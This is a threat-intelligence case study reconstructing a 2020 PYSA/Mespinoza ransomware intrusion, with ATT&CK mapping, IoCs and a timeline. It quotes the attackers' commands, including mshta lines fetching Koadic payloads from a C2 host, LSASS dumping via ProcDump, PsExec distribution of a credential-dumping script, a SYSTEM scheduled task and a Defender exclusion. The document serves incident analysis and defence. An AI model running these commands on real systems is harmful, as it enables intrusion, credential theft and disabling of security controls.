# PYSA / Mespinoza - DFIR Case Study

👉🏾 [**Version française disponible ici**](./dfir_case_study_FR.md)

**AFRINTEL Threat Actor Intelligence**

- **Actor / Group:** PYSA / Mespinoza
- **Threat Type:** Ransomware / Double Extortion
- **Analysis Type:** DFIR intrusion reconstruction
- **Documented Intrusion Duration:** ~8 hours
- **Primary Technical Source:** The DFIR Report
- **Report Date:** 23 November 2020
- **Confidence Level:** High
- **Last AFRINTEL Update:** 25 August 2026

---

## 1. Incident Summary

The DFIR Report documented a PYSA / Mespinoza intrusion lasting approximately eight hours from initial access to final ransomware deployment.

The threat actor obtained initial access to a Windows host with RDP directly exposed to the Internet by using a valid Domain Administrator account.

Initial connections and several subsequent access pivots originated from three different Tor exit nodes.

After initial access, the actor rapidly:

1. moved laterally to the domain controller;
2. deployed PowerShell Empire;
3. performed multiple credential-dumping operations;
4. used Koadic as an additional C2 channel;
5. browsed and collected data;
6. prepared ransomware deployment;
7. encrypted systems approximately 7.5 hours after initial access.

Data exfiltration was not directly observed in clear text during the intrusion. It was nevertheless confirmed after encryption when exfiltrated canary documents generated callbacks from Tor exit nodes.

---

## 2. Attack Chain

### 2.1 Initial Access

- **T1133 – External Remote Services**
  - RDP service directly exposed to the Internet.

- **T1078 – Valid Accounts**
  - Use of a valid Domain Administrator account.

- **T1021.001 – Remote Desktop Protocol**
  - Interactive RDP connection.

The initial access originated from a Tor exit node.

During the intrusion, three IP addresses associated with the Tor network were successively used to maintain RDP access.

**Evidence:** Observed  
**Confidence:** High

---

### 2.2 Execution and Post-Exploitation

#### PowerShell Empire

- **T1059.001 – PowerShell**
  - Deployment of a PowerShell Empire launcher only minutes after initial access.

Empire remained active throughout the intrusion and appears to have served as a secondary or backup C2 channel.

#### Koadic

- **T1218.005 – Mshta**
  - Koadic launched through `mshta.exe`.

Observed examples:

```text
mshta http://45.147.231.210:9999/8k6Mq
mshta http://45.147.231.210:9999/VtgyT
```

Koadic uses JScript / VBScript and Windows Script Host for parts of its execution chain.

**Evidence:** Observed  
**Confidence:** High

---

## 3. Persistence

- **T1053.005 – Scheduled Task/Job: Scheduled Task**
  - Koadic created a scheduled task that executed at logon under the SYSTEM context.

Observed command:

```text
schtasks /create /tn K0adic /tr "C:\Windows\system32\mshta.exe C:\ProgramData\SZWXNUHHDP.hta" /sc onlogon /ru System /f
```

The HTA file was stored at:

```text
C:\ProgramData\SZWXNUHHDP.hta
```

**Evidence:** Observed  
**Confidence:** High

---

## 4. Credential Access

One of the most significant aspects of the intrusion was the use of multiple credential-access methods.

### LSASS

- **T1003.001 – OS Credential Dumping: LSASS Memory**

Observed techniques included:

- manual LSASS dump through Task Manager;
- LSASS dump through `comsvcs.dll`;
- attempted use of ProcDump;
- execution of Invoke-Mimikatz.

Attempted ProcDump command:

```text
procdump.exe -accepteula -ma lsass.exe mem.dmp
```

The report notes that ProcDump was not present on the affected endpoint. This method was therefore **attempted**, but not successfully executed on that host.

### comsvcs.dll

A PowerShell script distributed through PsExec used `comsvcs.dll` to generate an LSASS dump.

This also maps to:

- **T1218.011 – Rundll32**
- **T1003.001 – LSASS Memory**

### NTDS

- **T1003.003 – OS Credential Dumping: NTDS**

The threat actor created and accessed a Shadow Copy containing `ntds.dit` on the domain controller.

Windows **Event ID 1917** was observed when the Active Directory Shadow Copy backup was created.

### Additional Methods

The report also documents:

- Invoke-Mimikatz;
- extraction of LSA Secrets;
- retrieval and decoding of credentials from the backup application's SQL database;
- use of the Koadic `hashdump_sam` module.

**Evidence:** Observed  
**Confidence:** High

---

## 5. Discovery

The actor used multiple native Windows utilities:

```text
quser.exe
whoami.exe /user
net.exe group /domain
net.exe group "Domain Users" /domain
nltest.exe /dclist:
arp -a
```

Associated techniques include:

- **T1087 – Account Discovery**
- **T1018 – Remote System Discovery**
- **T1482 – Domain Trust Discovery**
- **T1057 – Process Discovery**

Additional tools were also used:

- Advanced Port Scanner;
- ADRecon.

The actor also browsed several MMC consoles related to Active Directory, DNS, Group Policy, storage and backups.

**Evidence:** Observed  
**Confidence:** High

---

## 6. Lateral Movement

### RDP

- **T1021.001 – Remote Desktop Protocol**

RDP was the main lateral-movement mechanism.

The first pivot to a domain controller occurred approximately three minutes after initial access.

### PsExec

PsExec was then used to distribute and execute a PowerShell credential-dumping script across multiple systems.

Documented command:

```text
PsExec.exe -d \\HOST -u "DOMAIN\USER" -p "PASSWORD" -accepteula -s cmd /c "powershell.exe -ExecutionPolicy Bypass -file \\DOMAINCONTROLLER\share$\p.ps1"
```

Associated techniques:

- **T1569.002 – Service Execution**
- **T1021.002 – SMB/Windows Admin Shares**

**Evidence:** Observed  
**Confidence:** High

---

## 7. Command and Control

Three primary C2 channels were identified:

1. RDP;
2. PowerShell Empire;
3. Koadic.

### Observed Infrastructure

#### RDP / Tor

```text
198.96.155.3
23.129.64.190
185.220.100.240
```

These three IP addresses were identified as Tor exit nodes at the time of the incident.

#### Empire

```text
194.36.190.74:443
```

#### Koadic

```text
45.147.231.210:9999
```

**Important:** these IoCs are historical and relate to the documented 2020 incident. They should not be treated as currently active indicators without additional validation.

---

## 8. Exfiltration

- **T1041 – Exfiltration Over C2 Channel**

The DFIR Report states that no clear-text exfiltration was directly observed during the intrusion.

However, after ransomware deployment, canary documents present in the environment were opened externally.

The callbacks originated from Tor exit nodes.

This confirms that files had left the environment.

The source assesses that exfiltration was likely performed through one of the channels already controlled by the attacker:

- RDP;
- Empire;
- Koadic.

**AFRINTEL qualification:**

- **Data exfiltration: Confirmed**
- **Exact exfiltration channel: Assessed / Unconfirmed**
- **Final exfiltration infrastructure: Not established**

**Confidence:**
- Exfiltration: High
- Channel used: Medium

---

## 9. Defense Evasion

The actor actively disabled or bypassed security controls.

Observed actions included:

- disabling Windows Defender through Group Policy;
- modifying `MpPreference`;
- adding a Defender exclusion for `.exe` files;
- terminating multiple processes related to security, databases, backups and server applications.

Observed command:

```powershell
Add-MpPreference -ExclusionExtension ".exe"
```

**Windows Defender Event ID 5007** events were generated after the configuration change.

**Evidence:** Observed  
**Confidence:** High

---

## 10. Impact

- **T1486 – Data Encrypted for Impact**

Approximately 7.5 hours after initial access, the actor began ransomware deployment.

Two files were delivered through RDP:

```text
C:\Users\USER\Downloads\svchost.exe
C:\Users\USER\Downloads\p.ps1
```

The PowerShell script:

- disabled security controls;
- terminated multiple processes;
- checked / enabled RDP in the firewall;
- prepared the host for encryption.

The PYSA binary was then executed to encrypt the system.

**Evidence:** Observed  
**Confidence:** High

---

## 11. IoCs and Technical Artifacts

### Network Infrastructure

| Type | Value | Context |
|---|---|---|
| IPv4 | `198.96.155.3` | RDP / Tor exit |
| IPv4 | `23.129.64.190` | RDP / Tor exit |
| IPv4 | `185.220.100.240` | RDP / Tor exit |
| IPv4 | `45.147.231.210` | Koadic C2 |
| IPv4 | `194.36.190.74` | Empire C2 |

### Files

```text
svchost.exe
p.ps1
XEKFGUIQQB.hta
```

### Documented SHA-256 Hashes

```text
df0cd6a8a67385ba67f9017a78d6582db422a137160176c2c5c3640b482b4a6c
eb1d0acd250d32e16fbfb04204501211ba2a80e34b7ec6260440b7d563410def
0ab8f14e2c1e6f7c4dfa3d697d935d4fbef3605e15fd0d489d39b7f82c84ba7e
81e0d5945ab7374caf2353f8d019873c88728a6c289884a723321b8a21df3c77
```

> IoCs should be preserved with their date and historical context. Their present-day presence does not, by itself, establish attribution to PYSA.

---

## 12. Simplified Analytical Timeline

```text
T+00:00   Exposed RDP + valid Domain Admin account
    │
T+00:03   Lateral movement to Domain Controller
    │
    ├── Discovery
    ├── PowerShell Empire
    │
    ├── Credential Dumping
    │      ├── Task Manager → LSASS
    │      ├── comsvcs.dll → LSASS
    │      ├── Mimikatz
    │      └── NTDS.dit / Shadow Copy
    │
    ├── Koadic
    ├── RDP / PsExec
    ├── Data Collection
    ├── Defense Evasion
    │
T+~07:30  PYSA deployment
    │
    ▼
Encryption
    │
    ▼
Canary document callbacks
    │
    ▼
Exfiltration confirmed
```

---

## 13. AFRINTEL Assessment

This case is a particularly useful example of full ransomware-intrusion reconstruction.

It demonstrates that technical attribution should not rely solely on the final ransomware binary.

The assessment is based on correlation of:

- RDP access;
- compromised accounts;
- Tor infrastructure;
- C2 frameworks;
- PowerShell;
- credential dumping;
- lateral movement;
- collection;
- exfiltration;
- ransomware;
- DFIR timeline.

AFRINTEL classifies the elements in this case study as **TTPs documented in this specific PYSA incident**.

They must not automatically be applied to every PYSA victim tracked by AFRINTEL.

---

## 14. Primary Source

- The DFIR Report - **PYSA/Mespinoza Ransomware**
- Publication: 23 November 2020
- Investigation: Case 1010
- MITRE ATT&CK mapping and IoCs provided by The DFIR Report
- Source: https://thedfirreport.com/2020/11/23/pysa-mespinoza-ransomware/

---

**AFRINTEL - African Cyber Threat Intelligence**
